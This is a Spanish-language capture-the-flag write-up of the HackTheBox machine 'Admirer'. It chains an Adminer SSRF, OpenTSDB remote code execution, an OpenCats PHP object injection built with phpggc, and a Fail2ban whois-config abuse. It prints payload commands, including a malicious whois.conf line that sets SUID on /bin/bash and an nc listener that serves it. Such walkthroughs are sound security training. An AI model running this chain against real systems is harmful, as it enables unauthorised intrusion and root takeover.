----------
- Tags: #subdomain #adminer #SSRF #local-port-forwarding #port-discovery #opentsdb #opencats #fail2ban #phpggc #whois 
---------------
## Técnicas utilizadas
- Subdomain Enumeration  
- Adminer Enumeration  
- SSRF (Server Side Request Forgery) in Adminer [CVE-2021-21311]  
- Abusing redirect to discover internal services  
- OpenTSDB Exploitation [CVE-2020-35476] [Remote Code Execution]  
- Searching for valid metrics  
- OpenCats PHP Object Injection to Arbitrary File Write  
- Abusing Fail2ban [Remote Code Execution] (CVE-2021-32749)  
- Playing with phpggc in order to serialize our data  
- Abusing whois config file + OpenCats + Fail2ban [Privilege Escalation]
## Procedimientos
![[Pasted image 20230719130350.png]]

#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80 -oN Ports 10.10.11.137
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 11:59 MST
Nmap scan report for 10.10.11.137
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 993347e65f1f2efd45a4ee6b78fbc0e4 (RSA)
|   256 4b285364925784775f8dbfafd522e110 (ECDSA)
|_  256 71ee8ee598ab08433b8629572326e910 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Admirer
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Un escaneo con **whatweb** para ver las tecnologías que corren por detras nos muestra lo siguiente:
```ruby
# whatweb 10.10.11.137
http://10.10.11.137 [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.11.137], JQuery[1.11.2], Modernizr[2.8.3-respond-1.4.2.min], Script, Title[Admirer], X-UA-Compatible[IE=edge]
```

---------------
#### Subdomain Enumeration  
Si visitamos la pagina, encontramos una web estatica. Solo contiene imagenes y demás. Enumerando por directorios, no llegamos a dar con nada importante realmente. Algo interesante es que si ocasionamos un **404 Not Found** y hacemos **Hovering** sobre la **IP** podemos ver el nombre de un dominio. Esto tambien lo podriamos haber visto con la herramienta **nslookup**.

Si colocamos el domino encontrado en el */etc/hosts* y recargamos la pagina, no vemos nada pero esto nos da la posibilidad de hacer un ataque de fuerza bruta para encontrar subdominios con herramientas como **Gobuster** o **Wfuzz**. Encontramos los siguientes subdominios:
![[Pasted image 20230720121134.png]]

Si visitamos ahora la pagina con el subdomino encontrado, vemos un login.
![[Pasted image 20230720121222.png]]

----------
#### Adminer Enumeration  
Vemos que al darle al boton **Login** nos autentica automaticamente, sin colocar ningun usuario ni contraseña. Vamos a interceptar esta petición con **BurpSuite** por que probablemente se estan enviando credenciales por detras que nosotros de primera no logramos ver. Y encontramos efectivamente credenciales:
![[Pasted image 20230720121546.png]]

------------
#### SSRF (Server Side Request Forgery) in Adminer [CVE-2021-21311]  
Enumerando un poco el **Adminer** ( Gestor de base de datos ) no llegamos a encontrar nada de relevancia. Sin embargo, vemos que la versión de Adminer ( Se puede ver en la pagina ) es algo antigua. Podemos buscar por vulnerabilidades existentes en la versión en uso. Encontramos un **SSRF**:
![[Pasted image 20230720121641.png]]

-----------
#### Abusing redirect to discover internal services
Bueno, el **CVE** nos dice que existe un **SSRF** en la parte de autentificación, basicamente nos dice que hay que tener la siguiente configuración para que se acontezca:
![[Pasted image 20230719150500.png]]

Además, nos deja un pequeño script en **python2** que nos automatiza el trabajo. Lo descargamos en nuestra maquina y lo ejecutamos. Este nos ejecutara un servidor en remoto que nos ayudara a descubrir los servicios internos. Mandamos la petición de burpsuite y podemos ver la petición. Bueno, ahora que sabemos que funciona, toca enumerar servicios internos. Podemos hacer un escaneo con **nmap** ahora filtrando por puertos que esten cerrados o filtrados externamente, el escaneo nos da los siguientes puertos:
![[Pasted image 20230720121906.png]]

Bien, ahora que conocemos algunos puertos filtrados a los cuales de primera no podemos llegar, podemos apuntar a estos a través del SSRF con el script y vemos lo siguiente:
![[Pasted image 20230720122331.png]]

----------
#### OpenTSDB Exploitation [CVE-2020-35476] Remote Code Execution
Damos con servicio **HTTP** que esta corriendo **OpenTSDB**. Si buscamos por vulnerabilidades en google, encontramos que existe un **RCE** y nos dejan ademas, una prueba de concepto la cual podemos replicar para conseguir ejecutar comandos. El output de lo anterior es el siguiente:
![[Pasted image 20230720123116.png]]

Al parecer ha fallado, esto dado a que necesitamos una **Metrica** que sea correcta.

-------
#### Searching for valid metrics
Si buscamos maneras de listar las **Metricas** existentes en **OpenTSDB** encontramos el siguiente [articulo](https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http) que nos dice que podemos mandar una petición a la **API** para listar las **Metricas**. Vemos las metricas:
![[Pasted image 20230720123420.png]]

--------
#### OpenCats PHP Object Injection to Arbitrary File Write
Una vez dentro, estamos como el usuario **OpenTSDB** y tenemos que migrar al usuario **Jennir**. Podemos encontrar las credenciales de **Jennifer** en un archivo de configuración para la base de datos del **Adminer**.
![[Pasted image 20230720125802.png]]

Si listamos los servicios que estan corriendo internamente, encontramos que hay uno que corresponde a una pagina web:
![[Pasted image 20230720125833.png]]

Podemos hacer **Port Forwarding** del puerto para tenerlo visible desde nuestra maquina. Al ingresar a la pagina vemos que se trata de un **OpenCats**. Si intentamos reutilizar las credenciales de **Jennifer** en el login podemos ingresar al panel de **Admin**:
![[Pasted image 20230720130351.png]]

Dentro podemos ver la versión que se esta actualmente utilizando para **OpenCats**:
![[Pasted image 20230720130417.png]]

Buscando por vulnerabilidades en **Google**, encontramos que hay una de tipo **Object Injection**. Nos comparten un [exploit](https://github.com/ambionics/phpggc), ademas de una [PoC](https://snoopysecurity.github.io/posts/09_opencats_php_object_injection/). Basicamente podemos subir una WebShell abusando de una **Deserialización** de la data. Abusando de esto, vemos que no podemos llegar a nada dado que el usuario que esta ejecutando el servidor web es **www-data**, asi que aunque pudieramos escribir en la pagina, seria como el usuario **www-data**.

-------
#### Abusing Fail2ban [Remote Code Execution] (CVE-2021-32749)  
Listando algunos logs de la maquina, damos con uno que resulta interesante y pertecene a **Fail2Ban**:
![[Pasted image 20230720132008.png]]

Si buscamos por vias potenciales para abusar de esto, encontramos un [articulo](https://research.securitum.com/fail2ban-remote-code-execution/) que explica muy bien como realizarlo. Vamos a tener que abusar de **Whois** y su archivo de configuración. Este archivo recide en **/usr/local/etc** directorio al cual de primeras no tenemos capacidad de lectura y escritura. Podemos crear una data **serializada** y dentro de esta intentar burlar las expresiones regulares de **Whois**. Leyendo del **repositorio** de **whois** encontramos que este lee del archivo de configuración un total de **512** bytes:
![[Pasted image 20230720112056.png]]

Asi que podemos crear una data que contenga esas caracteristicas:
```
# python -c 'print("]*10.10.10.10 10.10.10.10" + " "*500)' > whois.conf
```

-----------
#### Playing with phpggc in order to serialize our data  
Almacenamos el output en un archivo y posteriormente **serializamos** la data con **phpggc**:
```
# ./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf
```

Y esa data la pasamos a la **URL** que nos ofrecia el [PoC](https://snoopysecurity.github.io/posts/09_opencats_php_object_injection/) para que cree el archivo en la ruta deseada con la estructura indicada. La data final tendria que tener este aspecto:
![[Pasted image 20230720133737.png]]

Para verificar que lo anterior ha funcionado podemos ponernos en escucha por el puerto **43** ( puerto por defecto de **whois** ) y lanzamos un **whois** desde la maquina victima a la nuestra:
![[Pasted image 20230720133620.png]]

------
#### Abusing whois config file + OpenCats + Fail2ban [Privilege Escalation]
Ahora, podemos crear un archivo de configuración que sea tal como esto:
```
oiowahaishjdb ajdbasjd
~! chmod u+s /bin/bash
```

Nos ponemos en escucha con **Nc** por el puerto **43** compartiendo el archivo el archivo anteriormente creado:
```
# nc -lvnp 40 < pwned
```

Lo que nos quedaria por hacer es lograr que el servidor nos banee para que este aplique el **whois** el cual leera de nuestra maquina el archivo de configuración anteriormente creado y le asignara **SUID** a la **Bash**:
![[Pasted image 20230720134613.png]]

Listamos los privilegios de la **Bash** y es **SUID**:
![[Pasted image 20230720134633.png]]



